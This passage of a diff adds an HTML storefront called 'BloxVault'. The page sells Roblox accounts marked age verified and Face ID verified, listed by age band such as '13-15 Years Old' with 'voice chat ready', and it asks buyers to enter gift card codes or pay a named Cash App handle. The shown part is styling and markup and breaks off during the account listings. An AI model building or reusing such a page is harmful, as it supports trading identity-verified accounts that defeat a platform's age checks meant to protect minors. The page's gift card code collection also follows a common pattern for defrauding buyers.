@@ -1,0 +1,2034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#0a0a0f">
+    <title>BloxVault | Premium Roblox Marketplace</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-blue: #00f3ff;
+            --neon-purple: #bc13fe;
+            --neon-green: #0aff0a;
+            --dark-bg: #0a0a0f;
+        }
+        
+        /* REMOVED: -webkit-transform-style: preserve-3d from * selector */
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #16213e 100%);
+            background-attachment: fixed;
+            color: #fff;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+            /* Safari fix: prevent bounce */
+            overscroll-behavior-y: none;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .font-orbitron {
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        /* Fixed bright background - simplified for mobile */
+        .bright-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(0, 243, 255, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(188, 19, 254, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(255, 105, 180, 0.1) 0%, transparent 50%),
+                linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 50%, #0f0f1e 100%);
+            background-attachment: fixed;
+            pointer-events: none;
+            z-index: -1;
+            /* Safari fix: force GPU layer */
+            transform: translateZ(0);
+            -webkit-transform: translateZ(0);
+        }
+        
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: -1;
+            transform: translateZ(0);
+            -webkit-transform: translateZ(0);
+        }
+        
+        #loader {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .loader-text {
+            font-size: 4rem;
+            font-weight: 900;
+            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple), var(--neon-blue));
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shine 3s linear infinite;
+        }
+        
+        @keyframes shine {
+            to { background-position: 200% center; }
+        }
+        
+        .loader-bar {
+            width: 200px;
+            height: 4px;
+            background: #333;
+            margin-top: 2rem;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .loader-progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
+            width: 0%;
+            animation: load 2s ease-out forwards;
+        }
+        
+        @keyframes load {
+            to { width: 100%; }
+        }
+        
+        #main-content {
+            opacity: 0;
+            visibility: hidden;
+        }
+        
+        #main-content.loaded {
+            opacity: 1;
+            visibility: visible;
+            transition: opacity 0.5s ease;
+        }
+        
+        .glitch {
+            position: relative;
+        }
+        
+        .glitch::before,
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .glitch::before {
+            left: 2px;
+            text-shadow: -2px 0 #ff00c1;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim 5s infinite linear alternate-reverse;
+        }
+        
+        .glitch::after {
+            left: -2px;
+            text-shadow: -2px 0 #00fff9, 2px 2px #ff00c1;
+            animation: glitch-anim2 1s infinite linear alternate-reverse;
+        }
+        
+        @keyframes glitch-anim {
+            0% { clip: rect(30px, 9999px, 10px, 0); }
+            20% { clip: rect(80px, 9999px, 90px, 0); }
+            40% { clip: rect(10px, 9999px, 50px, 0); }
+            60% { clip: rect(60px, 9999px, 20px, 0); }
+            80% { clip: rect(40px, 9999px, 70px, 0); }
+            100% { clip: rect(90px, 9999px, 30px, 0); }
+        }
+        
+        @keyframes glitch-anim2 {
+            0% { clip: rect(10px, 9999px, 30px, 0); }
+            20% { clip: rect(50px, 9999px, 10px, 0); }
+            40% { clip: rect(20px, 9999px, 60px, 0); }
+            60% { clip: rect(70px, 9999px, 40px, 0); }
+            80% { clip: rect(30px, 9999px, 80px, 0); }
+            100% { clip: rect(60px, 9999px, 20px, 0); }
+        }
+        
+        .product-card {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(20, 20, 35, 0.9);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            /* REMOVED: transform: translate3d(0, 0, 0) - causing issues */
+            will-change: transform;
+            border-radius: 1rem;
+        }
+        
+        .product-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 40px rgba(0, 243, 255, 0.4);
+            background: rgba(30, 30, 50, 0.95);
+        }
+        
+        .product-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .product-card:hover::before {
+            left: 100%;
+        }
+        
+        .payment-badge {
+            background: linear-gradient(135deg, rgba(0,243,255,0.2), rgba(188,19,254,0.2));
+            border: 1px solid rgba(0,243,255,0.5);
+            animation: pulse-border 2s infinite;
+        }
+        
+        @keyframes pulse-border {
+            0%, 100% { border-color: rgba(0,243,255,0.5); box-shadow: 0 0 10px rgba(0,243,255,0.3); }
+            50% { border-color: rgba(0,243,255,1); box-shadow: 0 0 20px rgba(0,243,255,0.6); }
+        }
+        
+        .tab-btn {
+            position: relative;
+            overflow: hidden;
+            will-change: transform;
+        }
+        
+        .tab-btn::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--neon-blue);
+            transition: width 0.3s;
+        }
+        
+        .tab-btn.active::after {
+            width: 100%;
+        }
+        
+        .tab-btn.active {
+            color: var(--neon-blue);
+            text-shadow: 0 0 10px var(--neon-blue);
+        }
+        
+        .discord-btn {
+            background: #5865F2;
+            animation: discord-pulse 2s infinite;
+        }
+        
+        @keyframes discord-pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(88, 101, 242, 0.4); }
+            50% { box-shadow: 0 0 40px rgba(88, 101, 242, 0.8); }
+        }
+        
+        .cashapp-btn {
+            background: #00D632;
+            animation: cashapp-pulse 2s infinite;
+        }
+        
+        @keyframes cashapp-pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(0, 214, 50, 0.4); }
+            50% { box-shadow: 0 0 40px rgba(0, 214, 50, 0.8); }
+        }
+        
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #0a0a0f;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--neon-blue);
+            border-radius: 5px;
+        }
+        
+        .age-verified-badge {
+            background: linear-gradient(135deg, #00c853, #64dd17);
+            color: #000;
+            font-weight: bold;
+            animation: glow-green 2s infinite;
+        }
+        
+        @keyframes glow-green {
+            0%, 100% { box-shadow: 0 0 10px rgba(0, 200, 83, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(0, 200, 83, 0.8); }
+        }
+        
+        .face-id-badge {
+            background: linear-gradient(135deg, #2962ff, #2979ff);
+            animation: glow-blue 2s infinite;
+        }
+        
+        @keyframes glow-blue {
+            0%, 100% { box-shadow: 0 0 10px rgba(41, 98, 255, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(41, 98, 255, 0.8); }
+        }
+        
+        .sale-badge {
+            background: linear-gradient(135deg, #ff1744, #f50057);
+            animation: glow-red 2s infinite;
+        }
+        
+        @keyframes glow-red {
+            0%, 100% { box-shadow: 0 0 10px rgba(255, 23, 68, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(255, 23, 68, 0.8); }
+        }
+        
+        .price-original {
+            text-decoration: line-through;
+            color: #666;
+            font-size: 0.9em;
+        }
+        
+        .discount-badge {
+            background: rgba(255, 23, 68, 0.2);
+            color: #ff1744;
+            border: 1px solid rgba(255, 23, 68, 0.5);
+        }
+        
+        .robux-price {
+            color: #00a2ff;
+            font-weight: bold;
+        }
+        
+        .item-row {
+            transition: all 0.2s;
+            cursor: pointer;
+            will-change: transform;
+        }
+        
+        .item-row:hover {
+            background: rgba(255, 255, 255, 0.15) !important;
+            transform: translateX(5px);
+        }
+        
+        .item-row:active {
+            transform: scale(0.98);
+        }
+        
+        /* Modal Styles - FIXED for mobile */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            /* REMOVED: backdrop-filter - causes black screen on iOS */
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            padding: 20px;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border: 2px solid var(--neon-blue);
+            border-radius: 20px;
+            padding: 2rem;
+            max-width: 600px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 0 50px rgba(0, 243, 255, 0.5);
+            animation: modalSlideIn 0.3s ease;
+            position: relative;
+            /* Safari fix */
+            transform: translateZ(0);
+            -webkit-transform: translateZ(0);
+        }
+        
+        @keyframes modalSlideIn {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .gift-card-input, .roblox-username-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(0, 243, 255, 0.3);
+            border-radius: 10px;
+            padding: 1rem;
+            color: #fff;
+            font-family: monospace;
+            font-size: 1.1rem;
+            margin: 0.5rem 0;
+            transition: all 0.3s;
+            /* Safari fix */
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        
+        .gift-card-input:focus, .roblox-username-input:focus {
+            outline: none;
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
+        }
+        
+        .payment-option {
+            padding: 1rem;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 0.5rem;
+        }
+        
+        .payment-option:hover {
+            border-color: var(--neon-blue);
+            background: rgba(0, 243, 255, 0.1);
+        }
+        
+        .payment-option.selected {
+            border-color: var(--neon-blue);
+            background: rgba(0, 243, 255, 0.2);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-weight: bold;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            /* Safari fix */
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        
+        .submit-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.5);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 1.5rem;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            z-index: 10;
+        }
+        
+        .close-modal:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            color: #00c853;
+            text-align: center;
+            padding: 1rem;
+            font-weight: bold;
+        }
+        
+        .error-message {
+            display: none;
+            color: #ff1744;
+            text-align: center;
+            padding: 1rem;
+            font-weight: bold;
+        }
+        
+        /* Baddies bright theme */
+        .baddies-card {
+            background: linear-gradient(135deg, rgba(255, 105, 180, 0.2), rgba(255, 20, 147, 0.2)) !important;
+            border: 1px solid rgba(255, 105, 180, 0.6) !important;
+        }
+        
+        .baddies-card:hover {
+            border-color: #ff69b4 !important;
+            box-shadow: 0 0 40px rgba(255, 105, 180, 0.5) !important;
+            background: linear-gradient(135deg, rgba(255, 105, 180, 0.3), rgba(255, 20, 147, 0.3)) !important;
+        }
+        
+        .baddies-text {
+            color: #ff69b4 !important;
+        }
+        
+        /* Brain Rot / Tsunami theme */
+        .brainrot-card {
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.15), rgba(0, 204, 255, 0.15)) !important;
+            border: 1px solid rgba(0, 255, 136, 0.5) !important;
+        }
+        
+        .brainrot-card:hover {
+            border-color: #00ff88 !important;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.4) !important;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.25), rgba(0, 204, 255, 0.25)) !important;
+        }
+        
+        .brainrot-text {
+            color: #00ff88 !important;
+        }
+        
+        /* Section divider glow */
+        .section-divider {
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-blue), var(--neon-purple), var(--neon-blue), transparent);
+            box-shadow: 0 0 20px var(--neon-blue);
+            margin: 4rem auto;
+            max-width: 800px;
+        }
+        
+        /* Stock counter styles */
+        .stock-counter {
+            font-size: 0.75rem;
+            padding: 0.25rem 0.5rem;
+            border-radius: 9999px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .stock-low {
+            color: #ff1744;
+            border-color: rgba(255, 23, 68, 0.5);
+        }
+        
+        .stock-medium {
+            color: #ff9800;
+            border-color: rgba(255, 152, 0, 0.5);
+        }
+        
+        .stock-high {
+            color: #00c853;
+            border-color: rgba(0, 200, 83, 0.5);
+        }
+        
+        .out-of-stock {
+            opacity: 0.5;
+            pointer-events: none;
+            filter: grayscale(1);
+        }
+        
+        .out-of-stock-badge {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 23, 68, 0.9);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-weight: bold;
+            z-index: 10;
+        }
+        
+        /* Navigation - Fixed for Safari with GPU acceleration */
+        .nav-fixed {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            width: 100%;
+            z-index: 50;
+            background: rgba(10, 10, 15, 0.95);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            /* REMOVED: transform: translate3d(0, 0, 0) */
+            will-change: transform;
+        }
+        
+        /* Payment banner - Fixed for Safari */
+        .payment-banner {
+            position: fixed;
+            top: 80px;
+            left: 0;
+            right: 0;
+            width: 100%;
+            z-index: 40;
+            background: rgba(10, 10, 15, 0.95);
+            border-bottom: 1px solid rgba(0, 243, 255, 0.3);
+            /* REMOVED: transform: translate3d(0, 0, 0) */
+            will-change: transform;
+        }
+        
+        /* Mobile specific fixes */
+        @media (max-width: 768px) {
+            .modal-content {
+                padding: 1.5rem;
+                max-height: 85vh;
+            }
+            
+            .loader-text {
+                font-size: 2.5rem;
+            }
+            
+            .product-card {
+                margin-bottom: 1rem;
+            }
+        }
+        
+        /* iOS specific fixes */
+        @supports (-webkit-touch-callout: none) {
+            .modal {
+                /* iOS Safari specific: use solid background instead of backdrop-filter */
+                background: rgba(0, 0, 0, 0.98);
+            }
+        }
+    </style>
+</head>
+<body class="relative min-h-screen">
+
+    <!-- Fixed bright background -->
+    <div class="bright-bg"></div>
+    <div class="grid-overlay"></div>
+
+    <!-- Loading Screen -->
+    <div id="loader">
+        <h1 class="loader-text font-orbitron">BLOXVAULT</h1>
+        <div class="loader-bar">
+            <div class="loader-progress"></div>
+        </div>
+        <p class="mt-4 text-gray-400 font-semibold tracking-widest">LOADING MARKETPLACE...</p>
+    </div>
+
+    <!-- Purchase Modal -->
+    <div id="purchaseModal" class="modal">
+        <div class="modal-content relative">
+            <button class="close-modal" onclick="closeModal()">×</button>
+            <h2 class="text-3xl font-orbitron font-bold mb-4 text-center text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-purple-600">
+                COMPLETE PURCHASE
+            </h2>
+            <p class="text-gray-300 text-center mb-4">You are purchasing: <span id="modalItemName" class="text-cyan-400 font-bold"></span></p>
+            <p class="text-gray-300 text-center mb-6">Price: <span id="modalItemPrice" class="text-purple-400 font-bold"></span></p>
+            
+            <!-- Roblox Username -->
+            <label class="block text-sm font-semibold mb-2 text-gray-300">Your Roblox Username:</label>
+            <input type="text" id="robloxUsername" class="roblox-username-input" placeholder="@username" required>
+            
+            <!-- Payment Method Selection -->
+            <label class="block text-sm font-semibold mb-3 text-gray-300 mt-6">Select Payment Method:</label>
+            
+            <div class="payment-option selected" id="giftcardOption" onclick="selectPayment('giftcard')">
+                <div class="flex items-center gap-3">
+                    <span class="text-2xl">🎁</span>
+                    <div>
+                        <p class="font-bold text-cyan-400">Roblox Gift Card</p>
+                        <p class="text-xs text-gray-400">Enter gift card code</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payment-option" id="xboxOption" onclick="selectPayment('xbox')">
+                <div class="flex items-center gap-3">
+                    <span class="text-2xl">🎮</span>
+                    <div>
+                        <p class="font-bold text-green-400">Xbox Gift Card</p>
+                        <p class="text-xs text-gray-400">Enter Xbox gift card code</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payment-option" id="donateOption" onclick="selectPayment('donate')">
+                <div class="flex items-center gap-3">
+                    <span class="text-2xl">💰</span>
+                    <div>
+                        <p class="font-bold text-green-400">Please Donate (Robux)</p>
+                        <p class="text-xs text-gray-400">Pay via Please Donate stand</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payment-option" id="cashappOption" onclick="selectPayment('cashapp')">
+                <div class="flex items-center gap-3">
+                    <span class="text-2xl">💵</span>
+                    <div>
+                        <p class="font-bold text-green-400">Cash App</p>
+                        <p class="text-xs text-gray-400">Pay with Cash App</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Gift Card Input (shown by default) -->
+            <div id="giftCardSection">
+                <label class="block text-sm font-semibold mb-2 text-gray-300 mt-4">Roblox Gift Card Code:</label>
+                <input type="text" id="giftCardCode" class="gift-card-input" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19">
+            </div>
+            
+            <!-- Xbox Gift Card Input (hidden by default) -->
+            <div id="xboxSection" style="display: none;">
+                <label class="block text-sm font-semibold mb-2 text-gray-300 mt-4">Xbox Gift Card Code:</label>
+                <input type="text" id="xboxCardCode" class="gift-card-input" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" maxlength="29">
+            </div>
+            
+            <!-- Please Donate Info (hidden by default) -->
+            <div id="donateSection" style="display: none;">
+                <div class="bg-green-500/10 border border-green-500/30 rounded-lg p-4 mt-4">
+                    <p class="text-green-400 text-sm">✅ You selected Please Donate!</p>
+                    <p class="text-gray-300 text-sm mt-2">After submitting, join our Discord and send the Robux via Please Donate stand. We'll verify your username.</p>
+                </div>
+            </div>
+            
+            <!-- Cash App Info (hidden by default) -->
+            <div id="cashappSection" style="display: none;">
+                <div class="bg-green-500/10 border border-green-500/30 rounded-lg p-4 mt-4">
+                    <p class="text-green-400 text-sm">✅ You selected Cash App!</p>
+                    <p class="text-gray-300 text-sm mt-2">Send payment to: <span class="font-bold text-green-400">$kinglogan78193</span></p>
+                    <a href="https://cash.app/$kinglogan78193" target="_blank" class="inline-block mt-2 text-cyan-400 hover:underline">Open Cash App →</a>
+                </div>
+            </div>
+            
+            <label class="block text-sm font-semibold mb-2 text-gray-300 mt-4">Your Discord Username (optional):</label>
+            <input type="text" id="discordUser" class="gift-card-input" placeholder="username#0000">
+            
+            <button onclick="submitPurchase()" id="submitBtn" class="submit-btn mt-6">
+                CONFIRM PURCHASE <span class="loading-spinner" id="spinner"></span>
+            </button>
+            
+            <div id="successMessage" class="success-message mt-4">
+                ✅ Purchase submitted! Check Discord for next steps.
+            </div>
+            <div id="errorMessage" class="error-message mt-4">
+                ❌ Error submitting. Please try again or contact Discord support.
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="main-content">
+        <!-- Navigation -->
+        <nav class="nav-fixed">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex justify-between items-center h-20">
+                    <div class="flex items-center gap-3 cursor-pointer" onclick="window.scrollTo(0,0)">
+                        <div class="w-10 h-10 bg-gradient-to-br from-cyan-400 to-purple-600 rounded-lg flex items-center justify-center shadow-lg shadow-cyan-500/30">
+                            <span class="text-2xl font-orbitron font-bold">B</span>
+                        </div>
+                        <span class="text-2xl font-orbitron font-bold glitch" data-text="BLOXVAULT">BLOXVAULT</span>
+                    </div>
+                    
+                    <div class="hidden md:flex items-center gap-8">
+                        <button onclick="scrollToSection('accounts')" class="hover:text-cyan-400 transition-colors font-semibold tracking-wider">ACCOUNTS</button>
+                        <button onclick="scrollToSection('items')" class="hover:text-cyan-400 transition-colors font-semibold tracking-wider">ITEMS</button>
+                        <button onclick="scrollToSection('custom')" class="hover:text-yellow-400 transition-colors font-semibold tracking-wider">CUSTOM</button>
+                        <button onclick="scrollToSection('brainrot')" class="hover:text-green-400 transition-colors font-semibold tracking-wider">BRAIN ROT</button>
+                    </div>
+
+                    <div class="flex items-center gap-2">
+                        <a href="https://discord.gg/2mr7dEP3f" target="_blank" class="discord-btn px-4 py-2 rounded-full font-bold hover:scale-105 transition-transform flex items-center gap-2 text-white text-sm">
+                            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+                            Discord
+                        </a>
+                        <a href="https://cash.app/$kinglogan78193" target="_blank" class="cashapp-btn px-4 py-2 rounded-full font-bold hover:scale-105 transition-transform flex items-center gap-2 text-white text-sm">
+                            <span class="text-lg">💵</span>
+                            Cash App
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Payment Info Banner -->
+        <div class="payment-banner">
+            <div class="max-w-7xl mx-auto px-4 py-2 flex items-center justify-center gap-4 text-sm flex-wrap">
+                <span class="payment-badge px-4 py-1 rounded-full font-bold text-cyan-400 flex items-center gap-2">
+                    <span class="text-lg">🎁</span>
+                    GIFT CARDS
+                </span>
+                <span class="text-gray-400">|</span>
+                <span class="payment-badge px-4 py-1 rounded-full font-bold text-green-400 flex items-center gap-2">
+                    <span class="text-lg">🎮</span>
+                    XBOX
+                </span>
+                <span class="text-gray-400">|</span>
+                <span class="payment-badge px-4 py-1 rounded-full font-bold text-green-400 flex items-center gap-2">
+                    <span class="text-lg">💰</span>
+                    PLEASE DONATE
+                </span>
+                <span class="text-gray-400">|</span>
+                <span class="payment-badge px-4 py-1 rounded-full font-bold text-green-400 flex items-center gap-2">
+                    <span class="text-lg">💵</span>
+                    CASH APP
+                </span>
+            </div>
+        </div>
+
+        <!-- Hero Section -->
+        <section class="relative z-10 pt-40 pb-20 px-4">
+            <div class="max-w-7xl mx-auto text-center">
+                <h1 class="text-5xl md:text-7xl font-orbitron font-black mb-6 leading-tight drop-shadow-[0_0_30px_rgba(0,243,255,0.5)]">
+                    PREMIUM <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-purple-600">ROBLOX</span><br>
+                    MARKETPLACE
+                </h1>
+                <p class="text-xl md:text-2xl text-gray-300 max-w-2xl mx-auto mb-8 font-light">
+                    Age verified & Face ID accounts, rare items, and exclusive deals.
+                </p>
+                
+                <div class="flex justify-center gap-4 mb-16 flex-wrap">
+                    <button onclick="switchTab('accounts')" id="tab-accounts" class="tab-btn active px-6 py-3 bg-white/10 border border-white/20 rounded-lg font-orbitron font-bold text-lg hover:bg-white/20 transition-all">
+                        🤖 ACCOUNTS
+                    </button>
+                    <button onclick="switchTab('items')" id="tab-items" class="tab-btn px-6 py-3 bg-white/10 border border-white/20 rounded-lg font-orbitron font-bold text-lg hover:bg-white/20 transition-all">
+                        🎮 ITEMS
+                    </button>
+                    <button onclick="switchTab('custom')" id="tab-custom" class="tab-btn px-6 py-3 bg-white/10 border border-white/20 rounded-lg font-orbitron font-bold text-lg hover:bg-white/20 transition-all text-yellow-400">
+                        ✨ CUSTOM
+                    </button>
+                    <button onclick="switchTab('brainrot')" id="tab-brainrot" class="tab-btn px-6 py-3 bg-white/10 border border-white/20 rounded-lg font-orbitron font-bold text-lg hover:bg-white/20 transition-all text-green-400">
+                        🧠 BRAIN ROT
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ACCOUNTS SECTION -->
+        <section id="accounts-section" class="relative z-10 px-4 pb-20">
+            <div class="max-w-7xl mx-auto">
+                <div class="flex items-center justify-between mb-12">
+                    <h2 class="text-4xl font-orbitron font-bold flex items-center gap-3">
+                        <span class="w-2 h-8 bg-cyan-400 rounded-full shadow-[0_0_10px_#00f3ff]"></span>
+                        AGE VERIFIED ACCOUNTS
+                    </h2>
+                    <div class="flex gap-2">
+                        <span class="age-verified-badge px-3 py-1 rounded-full text-sm">✓ Age Verified</span>
+                        <span class="face-id-badge px-3 py-1 rounded-full text-sm text-white">✓ Face ID</span>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                    <!-- Account cards -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden group" onclick="openPurchaseModal('13-15 Year Verified Account', '$10 Robux')">
+                        <div class="absolute top-4 right-4 flex flex-col gap-2">
+                            <span class="age-verified-badge px-3 py-1 rounded-full text-xs">AGE VERIFIED</span>
+                            <span class="face-id-badge px-3 py-1 rounded-full text-xs text-white">FACE ID</span>
+                        </div>
+                        <div class="w-full h-48 bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl mb-6 flex items-center justify-center relative overflow-hidden border border-white/10">
+                            <span class="text-6xl">🎂</span>
+                            <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
+                                <span class="text-green-400 font-bold text-sm">13-15 Years Old</span>
+                            </div>
+                        </div>
+                        <h3 class="text-2xl font-bold mb-2 font-orbitron">13-15 Year Verified</h3>
+                        <p class="text-gray-300 mb-4 text-sm">Face ID verified • Age 13-15 • Voice chat ready • Clean history</p>
+                        <div class="flex items-center justify-between mb-4">
+                            <div class="bg-white/10 px-4 py-2 rounded-lg border border-cyan-500/30">
+                                <span class="text-2xl font-bold robux-price">$10 Robux</span>
+                            </div>
+                            <span class="text-gray-400 text-sm">Stock: 8</span>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-cyan-600 to-blue-600 rounded-lg font-bold hover:from-cyan-500 hover:to-blue-500 transition-all pointer-events-none shadow-lg shadow-cyan-500/20">
+                            Buy Now
+                        </button>
+                    </div>
+
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden group" onclick="openPurchaseModal('16-17 Year Verified Account', '$20 Robux')">
